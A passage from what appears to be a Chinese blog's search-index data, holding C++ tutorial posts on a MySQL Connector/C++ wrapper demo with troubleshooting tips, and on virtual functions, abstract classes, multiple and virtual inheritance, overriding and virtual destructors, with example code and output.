endl; };}// 析构函数MysqlDB::~MysqlDB() {}// 用于执行任何 SQL 语句，返回一个 bool 值，表明执行该 SQL 语句是否返回了 ResultSet// 如果执行后第一个结果是 ResultSet，则返回 true，否则返回 falsebool MysqlDB::Execute(const char* sql) { try { if (this-&gt;connection) { unique_ptr&lt;Statement&gt; statement = nullptr; statement.reset(this-&gt;connection-&gt;createStatement()); if (statement) { return statement-&gt;execute(sql); } } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; } return false;}// 用于执行 INSERT、UPDATE 或 DELETE 语句以及 SQL DDL（数据定义语言）语句，例如 CREATE TABLE 和 DROP TABLE// 函数的返回值是一个整数，指示受影响的行数，对于 CREATE TABLE 或 DROP TABLE 等不操作行的语句，返回值总为零int MysqlDB::ExecuteUpdate(const char* sql) { try { if (this-&gt;connection) { unique_ptr&lt;Statement&gt; statement = nullptr; statement.reset(this-&gt;connection-&gt;createStatement()); if (statement) { return statement-&gt;executeUpdate(sql); } } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; } return 0;}// 基于 SQL 的预编译机制，执行查询单个结果集（ResultSet）的 SQL 语句，例如 SELECT 语句unique_ptr&lt;ResultSet&gt; MysqlDB::Query(const char* sql, const vector&lt;string&gt; parameters) { unique_ptr&lt;ResultSet&gt; resultSet = nullptr; try { if (this-&gt;connection) { int index = 0; unique_ptr&lt;PreparedStatement&gt; statement = nullptr; statement.reset(this-&gt;connection-&gt;prepareStatement(sql)); if (statement) { for (auto iterator = parameters.cbegin(); iterator != parameters.cend(); iterator++) { index++; statement-&gt;setString(index, (*iterator).c_str()); } resultSet.reset(statement-&gt;executeQuery()); } } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; } return resultSet;} main.cpp 12345678910111213141516171819202122#include &lt;iostream&gt;#include "mysqldb.h"using namespace std;int main() { unique_ptr&lt;MysqlDB&gt; db(new MysqlDB("tcp://127.0.0.1:3306", "root", "123456", "t_shop")); string querySql = "select * from properties where `KEY` = ?"; unique_ptr&lt;ResultSet&gt; result = db-&gt;Query(querySql.c_str(), { "test_limit_price" }); if (result) { cout &lt;&lt; "Query: " &lt;&lt; querySql &lt;&lt; endl; while (result-&gt;next()) { cout &lt;&lt; result-&gt;getInt("ID") &lt;&lt; " | "; cout &lt;&lt; result-&gt;getString("KEY").c_str() &lt;&lt; " | "; cout &lt;&lt; result-&gt;getString("VALUE").c_str() &lt;&lt; " | "; cout &lt;&lt; result-&gt;getString("REMARK").c_str() &lt;&lt; " | "; cout &lt;&lt; endl; } } return 0;} 程序运行输出的结果如下： 12Query: select * from properties where `KEY` = ?27 | test_limit_price | 30.5 | 限制价格 | 常见问题缺失 Boost 库错误信息： 项目执行编译操作后，VS 出现下述错误信息，这是本地缺失 boost 库导致的。1fatal error C1083: 无法打开包括文件: “boost/shared_ptr.hpp”: No such file or directory 解决方法： a) 在 Boost 官网 下载最新版本的 Boost，并解压到本地磁盘，例如解压路径为：C:\\Program Files\\boost_1_77_0 b) 右键项目，选择 属性，导航到 配置属性 -&gt; C/C++ -&gt; 常规 -&gt; 附加包含目录，添加 Boost 的安装路径（如 C:\\Program Files\\boost_1_77_0），如下图所示 c) 重新执行项目的编译操作 缺失 libssl-1_1-64.dll 文件错误信息： 项目运行后，系统弹窗提示以下错误信息。1由于找不到 libssl-1_1-64.dll，无法继续执行代码。重新安装程序可能会解决此问题。 解决方法： 安装 OpenSSL，并拷贝 libssl-1_1-64.dll 库文件到 VS 项目的目录中，具体步骤可参考上面的 OpenSSL - 安装 教程。 缺失 libcrypto-1_1-x64.dll 文件错误信息： 项目运行后，系统弹窗提示以下错误信息。1由于找不到 libcrypto-1_1-x64.dll，无法继续执行代码。重新安装程序可能会解决此问题。 解决方法： 安装 OpenSSL，并拷贝 libcrypto-1_1-x64.dll 库文件到 VS 项目的目录中，具体步骤可参考上面的 OpenSSL - 安装 教程。 MySQL Connector/C++ 介绍简介MySQL Connector/C++ 是一个 MySQL 数据库连接器，包含了 C++ 连接 MySQL 服务器所需的头文件和库文件，支持开发使用基于 JDBC 的 API 的 C++ 应用程序。 开发优势与 MySQL 客户端库提供的 MySQL C 语言 API 相比，MySQL Connector/C++ 为 C++ 用户提供以下好处： 纯 C++ 开发的便利 支持基于 JDBC 4.0 的 API 支持面向对象的编程范式 减少项目的开发时间 可根据要求获得商业许可证 根据 GPL 获得许可，但 FLOSS 许可除外 分发方式MySQL Connector/C++ 有二进制文件和源代码分发版以特定于平台的打包格式提供： 二进制分发版可用于 Windows、Linux、Unix 和类 Unix 平台 源代码分发版可作为压缩的 tar 文件或 zip 文件提供，并可在任何受支持的平台上使用 源代码存储库使用 Git 存储，可在 GitHub 上获得。 与 JDBC 的兼容性MySQL Connector/C++ 与 JDBC 4.0 API 兼容，没有实现整个 JDBC 4.0 API，但具有以下类：Connection、DatabaseMetaData、Driver、PreparedStatement、ResultSet、ResultSetMetaData、Savepoint、Statement。JDBC 4.0 API 为刚才提到的类定义了大约 450 个方法，MySQL Connector/C++ 实现了其中的大约 80%。 支持的平台和先决条件对于 MySQL Connector/C++ 1.1.11 及更高版本，商业和社区发行版需要 Visual C++ Redistributable for Visual Studio 2015 才能在 Windows 平台上运行。从 MySQL Connector/C++ 1.1.10 开始，社区（非商业）发行版需要适用于 Visual Studio 2013 的 Visual C++ Redistributable。可在 Microsoft 下载中心获取 Redistributable 的安装包，在安装 MySQL Connector/C++ 之前安装它。 要运行带 MySQL Connector/C++ 的应用程序，需要 MySQL 5.6 或更高版本的数据库服务器 要构建带 MySQL Connector/C++ 的应用程序 在 Windows 系统上，需要 Microsoft Visual Studio 2015 要从源代码构建 MySQL Connector/C++ 在 Windows 系统上，需要 Microsoft Visual Studio 2015 Building Connector/C++ 需要 MySQL 5.7（5.7.9 或更高版本）或 MySQL 8.0（8.0.11 或更高版本）的客户端库 参考文档 mysql-connector-demo MySQL Connector/C++ 官方文档 MySQL Connector/C++ Github 仓库 MySQL Connector/C++ 官方 API 使用教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之九",url:"/posts/f1a16291.html",text:'多态的原理多态的实现原理 当类中声明了虚函数时，编译器会在类中生成一个虚函数表 虚函数表是一个存储类成员函数指针的数据结构 虚函数表是由编译器自动生成和维护的 虚函数（virtual）会被编译器放入虚函数表中 当存在虚函数时，每个对象中都有一个指向虚函数表的指针（C++ 编译器给父类对象、子类对象提前设置了 VPTR 虚函数表指针，因此 C++ 编译器不需要区分子类对象或者父类对象，只需要在 base 指针中，找 VPTR 指针即可） VPTR 虚函数表指针一般作为类对象的第一个成员 多态的实现原理图解 a) 多态实现原理的图解 如图 所示 b) 通过 VPTR 虚函数表指针调用重写函数的过程是在程序运行时进行的，因此需要通过寻址操作才能确定真正应该调用的函数，而普通成员函数是在编译时就确定了调用的函数 c) 在效率上，虚函数的效率要低很多，因此出于效率考虑，没有必要将所有成员函数都声明为虚函数，即使 C++ 编译器允许这么做 d) 由于有了虚函数表，C++ 编译器不再需要知道是子类对象还是父类对象，这往往会给我们造成一种假象：C++ 编译器能识别子类对象或者父类对象 证明 VPTR 指针的存在12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;class Parent1 {public: Parent1(int a) { this-&gt;a = a; } // 不声明虚函数 void print() { cout &lt;&lt; "I\'m parent1" &lt;&lt; endl; }private: int a;};class Parent2 {public: Parent2(int a) { this-&gt;a = a; } // 声明虚函数 virtual void print() { cout &lt;&lt; "I\'m parent2" &lt;&lt; endl; }private: int a;};int main() { // 由于指针也是一种数据类型，由于在Parent2类中声明了虚函数，若Parent2类里存在VPTR指针，那么下面两个类的大小应该是不一样的 cout &lt;&lt; "sizeof(Parent1): " &lt;&lt; sizeof(Parent1) &lt;&lt; endl; cout &lt;&lt; "sizeof(Parent2): " &lt;&lt; sizeof(Parent2) &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 12sizeof(Parent1): 4sizeof(Parent2): 8 父类指针和子类指针的步长可能是不一样的 a) 指针也只一种数据类型，对 C++ 类对象的指针执行 ++、-- 运算符仍然是合法的 b) "多态是用父类的指针指向子类的对象" 和 "父类指针步长的自加（++）" 是两个完全不同的概念 c) 当子类继承父类后，没有添加任何自己的成员变量和成员函数，那么此时父类指针和子类指针的步长才是一样的 d) 指针运算是按照指针所指的类型进行的，父类指针和子类指针的步长可能是不一样的，不要用父类指针自加（++）、自减（--）的方式来操作子类的对象数组 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;using namespace std;class Parent{public: Parent(int a = 0) { this-&gt;a = a; } virtual void print() { cout &lt;&lt; "I\'m parent" &lt;&lt; endl; }private: int a;};class Child : public Parent{public: Child(int b, int c) :Parent(0) { this-&gt;b = b; this-&gt;c = c; } virtual void print() { cout &lt;&lt; "I\'m child" &lt;&lt; endl; }private: int b; int c;};int main(){ Parent* parent = NULL; Child* child = NULL; Child array[] = { Child(1, 2), Child(3,4), Child(5, 6) }; parent = array; child = array; // 指针自加运算后运行可能会出错，这里父类指针和子类指针的步长是不一样的，不要用父类指针自加（`++`）、自减（`--`）的方式来操作子类的对象数组 parent++; child++; parent++; child++; return 0;} 在父类的构造函数中调用虚函数，不能实现多态子类的 VPTR 指针是分步完成初始化的，当执行父类的构造函数时，子类 的 VPTR 指针指向父类的虚函数表，当父类的构造函数执行完毕后，才会把子类的 VPTR 指针指向子类的虚函数表。因此，在父类的构造函数中调用虚函数，不能实现多态。 a) 分析图解 如图 所示 b) 对象在创建的时，由编译器对 VPTR 指针进行初始化 c) 只有当对象的构造全部完成后，VPTR 指针的指向才能最终确定 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; // 在父类的构造函数中调用虚函数 print(); } virtual void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int a, int c) : Parent(a) { this-&gt;c = c; } virtual void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Child child(5, 8); return 0;} 程序运行的输出结果如下： 1I\'m parent, a = 5 纯虚函数和抽象类纯虚函数和抽象类的基本概念基本概念： a) 纯虚函数是一个在基类中说明的虚函数，且在基类中没有被定义，要求任何派生类都定义自己的版本 b) 纯虚函数为各派生类提供一个公共界面，可以实现接口的封装和设计、软件的模块功能划分 c) 纯虚函数的声明形式： virtual 类型 函数名 ( 参数表 ) = 0; d) 一个具有纯虚函数的基类称为抽象类 使用限制： a) 可以声明抽象类的指针和引用 b) 抽象类不能创建对象（实例化） c) 抽象类不能作为函数的参数类型和返回值类型 纯虚函数和抽象类的应用案例定义一个图形抽象类 Figure，并声明了负责计算图形面积的纯虚函数 getArea()，然后再定义 Circle、Triangle、Squre 派生类，并各自实现了纯虚函数 getArea() 来计算不同图形的面积。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;iostream&gt;using namespace std;// 抽象类class Figure {public: // 声明纯虚函数，计算面积 virtual double getArea() = 0;};class Circle : public Figure {public: Circle(double r) { this-&gt;r = r; } // 计算圆的面积 virtual double getArea() { double area = 3.14 * r * r; cout &lt;&lt; "圆的面积: " &lt;&lt; area &lt;&lt; endl; return area; }private: double r;};class Triangle : public Figure {public: Triangle(double a, double b) { this-&gt;a = a; this-&gt;b = b; } // 计算三角形的面积 virtual double getArea() { double area = a * b / 2; cout &lt;&lt; "三角形的面积: " &lt;&lt; area &lt;&lt; endl; return area; }private: double a; double b;};class Square : public Figure {public: Square(double a, double b) { this-&gt;a = a; this-&gt;b = b; } // 计算四边形的面积 virtual double getArea() { double area = a * b; cout &lt;&lt; "四边形的面积: " &lt;&lt; area &lt;&lt; endl; return area; }private: double a; double b;};void printArea(Figure* base) { base-&gt;getArea();}int main() { // Figure f; // 错误写法，抽象类不能实例化 Triangle Triangle(20, 30); Circle circle(6.8); Square square(50, 60); // 可以声明抽象类的指针 Figure* pBase = new Circle(5.3); pBase-&gt;getArea(); // 可以声明抽象类的引用 Figure&amp; base = square; base.getArea(); printArea(&amp;Triangle); return 0;} 程序运行的输出结果如下： 123圆的面积: 88.2026四边形的面积: 3000三角形的面积: 300 纯虚函数和抽象类在多继承中的应用案例C++ 中没有 Java 中的接口概念，但可以使用抽象类和纯虚函数模拟 Java 中的接口（代码如下）。值得一提的是，C++ 中的接口类只有函数原型定义，没有任何数据的定义，同时继承多个接口类不会带来二义性和复杂性等问题。C++ 面向抽象类编程（Java 面向接口编程）是项目开发中重要技能之一。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;iostream&gt;using namespace std;// 定义接口类一class Interface1 {public: virtual int add(int a, int b) = 0; virtual void print() = 0;};// 定义接口类二class Interface2 {public: virtual int mult(int a, int b) = 0; virtual void print() = 0;};// 定义父类class Parent {public: Parent() { this-&gt;a = 8; } virtual ~Parent() { } virtual int getA() { return a; }private: int a;};// 定义子类，首先继承父类，然后继承多个接口类class Child : public Parent, public Interface1, public Interface2 {public: int add(int a, int b) { return a + b; } int mult(int a, int b) { return a * b; } void print() { cout &lt;&lt; "Child::print() 函数被执行" &lt;&lt; endl; }};int main() { Child child; child.print(); Parent* parent = &amp;child; cout &lt;&lt; "a = " &lt;&lt; parent-&gt;getA() &lt;&lt; endl; Interface1* interface1 = &amp;child; int result1 = interface1-&gt;add(2, 5); cout &lt;&lt; "2 + 5 = " &lt;&lt; result1 &lt;&lt; endl; Interface2* interface2 = &amp;child; int result2 = interface2-&gt;mult(3, 6); cout &lt;&lt; "3 * 6 = " &lt;&lt; result2 &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 123a = 82 + 5 = 73 * 6 = 18 纯虚函数和抽象类在多继承中的使用总结C++ 中没有 Java 中的接口概念： 绝大多数面向对象语言都不支持多继承 绝大多数面向对象语言都支持接口的概念 C++ 中没有 Java 中的接口概念，但可以使用抽象类和纯虚函数模拟 Java 中的接口 C++ 中的接口类只有函数原型定义，没有任何数据的定义（代码如下） ★点击显示示例代码★ 1234567class Interface { public: virtual void func1() = 0; virtual void func2(int i) = 0; virtual void func3(int i) = 0; }; 工程上多继承的使用说明： a) 多继承已经被实际开发经验所抛弃 b) 工程开发中真正意义上的多继承是几乎不被使用的 c) 多继承带来的代码复杂性远多于其带来的便利 d) 多继承对代码维护性上的影响是灾难性的 e) 在设计方法上，任何多继承都可以使用单继承代替 f) 在多继承中，使用虚继承不能完全解决二义性的问题 虚继承的使用与适用场景介绍 虚继承只适用于有共同基类（公共基类）的多继承场景（钻石菱形 ◇），如右图所示 对于 V 字形的多继承场景，虚继承是没办法解决二义性问题的，如右图所示 工程上继承多个接口类的使用说明： a) 继承多个接口类不会带来二义性和复杂性等问题 b) 多继承可以通过精心设计的单继承和接口类来代替 c) 接口类只是一个功能说明，而不是功能实现，子类需要根据功能说明定义功能实现 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之八",url:"/posts/4c2ae4c0.html",text:'多继承多继承概念 a) 一个类有多个直接基类（父类）的继承关系称为多继承 b) 类 C 可以根据访问控制同时继承类 A 和类 B 的成员，并添加自己的成员 c) 多继承声明语法 1234class 派生类名 : 访问控制 基类名1 , 访问控制 基类名2 , … , 访问控制 基类名n{ 数据成员和成员函数声明}; 多继承的简单应用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;using namespace std;class Base1 {public: Base1(int a) { this-&gt;a = a; } void printA() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Base2 {public: Base2(int b) { this-&gt;b = b; } void printB() { cout &lt;&lt; "b = " &lt;&lt; b &lt;&lt; endl; }private: int b;};class Base3 : public Base1, public Base2 {public: Base3(int a, int b, int c) : Base1(a), Base2(b) { this-&gt;c = c; } void printC() { cout &lt;&lt; "c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Base3 base(1, 2, 3); base.printA(); base.printB(); base.printC(); return 0;} 程序运行的输出结果如下： 123a = 1b = 2c = 3 派生类的构造函数和成员访问在多继承的派生类中，其构造函数和成员访问的特性如下： 拥有多个基类的派生类的构造函数，可以用初始化列表调用基类构造函数来初始化数据成员。 执行顺序与单继承构造函数情况类似，多个直接基类构造函数执行顺序取决于定义派生类时指定的各个继承基类的顺序。 一个派生类对象拥有多个直接或间接基类的成员。不同名成员访问不会出现二义性，如果不同的基类有同名成员，那么派生类对象访问时应该加以识别。 虚继承虚继承的概念 总结： 如果一个派生类从多个基类继承，而这些基类又有一个共同的基类（公共基类），则在对该基类中声明的成员进行访问时，可能会产生二义性。 如果在多条继承路径上有一个公共的基类，那么在继承路径的某处汇合点，这个公共基类就会在派生类的对象中产生多个基类子对象 要使这个公共基类在派生类中只产生一个子对象，必须对这个基类声明为虚继承，使这个基类成为 虚基类。 虚继承声明需要使用关键字：virtual 虚继承的简单应用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;using namespace std;class Base {public: Base(int x) { this-&gt;x = x; cout &lt;&lt; "Base 类的构造函数被调用" &lt;&lt; endl; } void printX() { cout &lt;&lt; "x = " &lt;&lt; x &lt;&lt; endl; }private: int x;};// 声明虚继承class Base1 : virtual public Base {public: Base1(int a, int x) : Base(x) { this-&gt;a = a; } void printA() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};// 声明虚继承class Base2 : virtual public Base {public: Base2(int b, int x) : Base(x) { this-&gt;b = b; } void printB() { cout &lt;&lt; "b = " &lt;&lt; b &lt;&lt; endl; }private: int b;};class Base3 : public Base1, public Base2 {public: // 由于父类和虚基类没有默认的无参构造函数，所以这里的派生类需要在初始化列表中，显式调用父类、虚基类的有参构造函数 Base3(int a, int b, int c, int x) : Base1(a, x), Base2(b, x), Base(x) { this-&gt;c = c; } void printC() { cout &lt;&lt; "c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Base3 base(1, 2, 3, 4); // 虚基类Base的构造函数只会被调用一次 base.printA(); base.printB(); base.printC(); base.printX(); // 当不声明虚继承的时候，此写法会产生二义性，C++编译器会出现编译错误 return 0;} 程序运行的输出结果如下： 12345Base 类的构造函数被调用a = 1b = 2c = 3x = 4 值得一提的是，如果虚基类声明了非默认形式的（即带参数的）构造函数，并且没有声明默认形式的（无参）构造函数，此时在整个继承关系中，直接或者间接继承虚基类的所有派生类，都必须在构造函数的成员初始化列表中列出对虚基类的初始化。因为涉及到多重继承和虚继承，为避免派生类因调用多个父类的构造函数后多次构造更上层虚基类，所以需要派生类自己显示调用继承而来的虚基类的构造函数，而继承链上其它所有对虚基类的构造函数调用将被忽略。简单一句话概况：父类不会帮子类调用虚基类的构造函数，子类在构造时必须自己初始化所有虚基类。 虚继承的适用场景 虚继承只适用于有共同基类（公共基类）的多继承场景（钻石菱形 ◇），如右图所示 对于 V 字形的多继承场景（代码如下），虚继承是没办法解决二义性问题的，如右图所示 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;using namespace std;class Base1 {public: Base1(int a) { this-&gt;a = a; } void print() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Base2 {public: Base2(int b) { this-&gt;b = b; } void print() { cout &lt;&lt; "b = " &lt;&lt; b &lt;&lt; endl; }private: int b;};class Base3 : virtual public Base1, virtual public Base2 {public: Base3(int a, int b) : Base1(a), Base2(b) { }};int main() { Base3 base(1, 2); // 虚继承只适用于有共同基类（公共基类）的多继承场景（钻石菱形 ◇） // 即使上面声明了虚继承，但此写法仍然会产生二义性，C++编译器会出现编译错误 // base.print(); base.Base1::print(); base.Base2::print(); return 0;} 程序运行的输出结果如下： 12a = 1b = 2 多态多态是面向对象的三大概念（如下）之一，按字面的意思就是多种形态。当类之间存在层次结构，并且类之间是通过继承关联时，就会使用到多态。C++ 的多态意味着调用成员函数时，会根据调用函数的对象的类型来执行不同的函数。值得一提的是，多态是设计模式的基础，同时也是框架的基石。 封装：突破了 C 语言函数的概念。 继承：提高了代码的可重用性。 多态：多态是指在不同继承关系的类对象中，去调同一函数，产生了不同的行为。多态的一般使用方式，是使用一个父类的指针或引用去调用子类中被重写的方法。 函数重写函数重写的概念 函数重写是指在子类中定义与父类中原型相同的函数 父类中被重写的函数依然会继承给子类 默认情况下，在子类中重写的函数将隐藏父类中的函数 通过作用域分辨符 :: 可以访问到父类中被隐藏的函数 函数重写只发生在父类与子类之间，而函数重载只发生在同一个类中 函数重写的应用12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; } void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int a, int c) : Parent(a) { this-&gt;c = c; } // 子类重写父类中的函数 void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Child child(3, 7); // 执行子类的函数，默认情况下子类中重写的函数将隐藏父类中的函数 child.print(); // 执行父类的函数，通过作用域分辨符"::"可以访问到父类中被隐藏的函数 child.Parent::print(); return 0;} 程序运行的输出结果如下： 12I\'m child, c = 7I\'m parent, a = 3 函数重写与函数重载的区别 函数重载 必须在同一个类中进行 子类无法重载父类的函数，父类同名函数将被子类的覆盖 重载是在编译期间根据参数类型、个数和顺序决定函数的调用 函数重写 必须发生于父类与子类之间 父类与子类中的函数必须有完全相同的原型 使用 virtual 关键字声明之后，能够产生多态（如果不使用 virtual 关键字声明，那叫重定义） 虚函数类型兼容原则遇上函数重写当 类型兼容原则 遇上函数重写时，执行以下代码后会出现意外的现象，即被调用的永远是父类的函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; } void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int c) : Parent(c) { this-&gt;c = c; } // 子类重写父类中的函数 void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Parent* p = NULL; Parent parent(6); Child child(5); // 执行父类的函数 p = &amp;parent; p-&gt;print(); // 执行父类的函数 p = &amp;child; p-&gt;print(); return 0;} 程序运行的输出结果如下： 12I\'m parent, a = 6I\'m parent, a = 5 C/C++ 是静态编译型语言，在执行编译时，编译器会自动根据指针的类型判断指向的是一个什么样的对象。但在编译 print() 函数的时候，编译器不可能知道指针 p 究竟指向了什么对象，因为程序还没有运行。同时编译译器没有理由报错，于是编译器认为最安全的做法是编译到父类的 print() 函数，因为父类和子类肯定都有相同的 print() 函数。这就是所谓的 静态多态 或 静态联编，函数调用在程序执行之前就已经准备好了；有时候这也被称为 早绑定，因为 print() 函数在程序编译期间就已经设置好了。这就引出了面向对象新的需求，希望根据实际的对象类型来判断重写函数的调用；如果父类指针指向的是父类对象则调用父类中定义的函数，如果父类指针指向的是子类对象则调用子类中定义的重写函数，如图所示。 虚函数的应用C++ 中通过 virtual 关键字对多态进行支持，使用 virtual 关键字声明的函数被重写后即可展现多态特性，一般称之为 虚函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; } // 使用 "virtual" 关键字声明父类的函数 virtual void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int c) : Parent(c) { this-&gt;c = c; } // 使用 "virtual" 关键字声明重写父类中的函数 // 只要父类中的函数有 "virtual" 关键字的声明，那么子类的 "virtual" 声明可写可不写，一般建议都写上 virtual void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Parent* p = NULL; Parent parent(6); Child child(5); // 执行父类的函数 p = &amp;parent; p-&gt;print(); // 执行子类的函数 p = &amp;child; p-&gt;print(); return 0;} 程序运行的输出结果如下： 12I\'m parent, a = 6I\'m child, c = 5 此时，编译器看的是指针的内容，而不是它的类型。因此，由于 Parent 和 Child 类的对象的地址存储在 *p 中，所以会调用各自的 print() 函数。正如所看到的，父类 Parent 的每个子类都有一个 print() 函数的独立实现。这就是多态的一般使用方式，即使用一个父类的指针或引用去调用子类中被重写的方法。有了多态就可以有多个不同的实现类，它们都带有同一个名称但具有不同实现的函数，函数的参数甚至可以是相同的。 虚析构函数虚析构函数的作用：为了避免内存泄漏，通过父类的指针，可以将所有子类对象的析构函数都执行一遍（释放所有的子类资源）。即虚析构函数使得在删除指向子类对象的父类指针时，可以调用子类的析构函数来实现释放子类中堆内存的目的，从而防止内存泄漏。 析构函数可以是虚的，虚析构函数用于指引 delete 运算符正确析构动态对象 构造函数不能是虚函数，因为建立一个派生类对象时，必须从类层次的根开始，沿着继承路径逐个调用基类的构造函数 虚析构函数的简单应用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;using namespace std;class A {public: A() { this-&gt;p = new char[20]; strcpy(p, "Hello A"); cout &lt;&lt; "A 类的构造函数被调用" &lt;&lt; endl; } virtual ~A() { delete[] this-&gt;p; cout &lt;&lt; "A 类的析构函数被调用" &lt;&lt; endl; }private: char* p;};class B : public A {public: B() { this-&gt;p = new char[20]; strcpy(p, "Hello B"); cout &lt;&lt; "B 类的构造函数被调用" &lt;&lt; endl; } ~B() { delete[] this-&gt;p; cout &lt;&lt; "B 类的析构函数被调用" &lt;&lt; endl; }private: char* p;};int main() { // 此写法，如果上面不使用 "virtual" 修饰A类（基类）的析构函数，派生类与所有基类的析构函数依然都会被自动调用一次 B* b = new B(); delete b; cout &lt;&lt; endl; // 此写法，如果上面不使用 "virtual" 修饰A类（基类）的析构函数，那么只有A类（基类）的析构函数会被调用一次，B类（派生类）的析构函数不会被调用，这样就会造成内存泄漏 // 虚析构函数的作用是，通过父类的指针，可以将所有子类对象的析构函数都执行一遍（释放所有的子类资源）。 A* a = new B(); delete a; return 0;} 程序运行的输出结果如下： 123456789A 类的构造函数被调用B 类的构造函数被调用B 类的析构函数被调用A 类的析构函数被调用A 类的构造函数被调用B 类的构造函数被调用B 类的析构函数被调用A 类的析构函数被调用 虚析构函数的作用总结 a) 如果基类的析构函数不加 virtual 关键字修饰，那么就是普通析构函数 当基类中的析构函数没有声明为虚析构函数时，派生类开始从基类继承，基类的指针指向派生类的对象时，delete 基类的指针时，只会调用基类的析构函数，不会调用派生类的析构函数 b) 如果基类的析构函数加 virtual 关键字修饰，那么就是虚析构函数 当基类中的析构函数声明为虚析构函数时，派生类开始从基类继承，基类的指针指向派生类的对象时，delete 基类的指针时，先调用派生类的析构函数，再调用基类中的析构函数 多态的理论基础 联编：是指一个程序模块、代码之间互相关联的过程 静态联编：是程序的匹配、连接在编译阶段实现，也称为早期联编（早绑定） 函数重载属于静态联编 动态联编：是指程序联编推迟到运行时进行，所以又称为晚期联编（迟绑定） 虚函数、switch 语句和 if 语句属于动态联编 多态理论联系实际应用（代码示例）： C++ 与 C 相同，是静态编译型语言 在编译时，编译器会自动根据指针的类型判断指向的是一个什么样的对象，所以编译器认为父类指针指向的是父类对象 由于程序没有运行，所以不可能知道父类指针指向的具体是父类对象还是子类对象 从程序安全的角度，编译器假设父类指针只指向父类对象，因此编译的结果为调用父类的成员函数，这种特性就是 静态联编 多态成立的三个必要条件 a) 要有继承 b) 要有虚函数重写 c) 父类指针或引用指向子类对象 C++ 11 的 override 和 finaloverride 关键字：用来检查函数是否重写，在子类中的函数声明里加上该关键字 virtual void fun() override {}，编译器就会自动检查对应的函数是否重写了父类中的函数final 关键字：在类的声明中加上该关键字 class A final 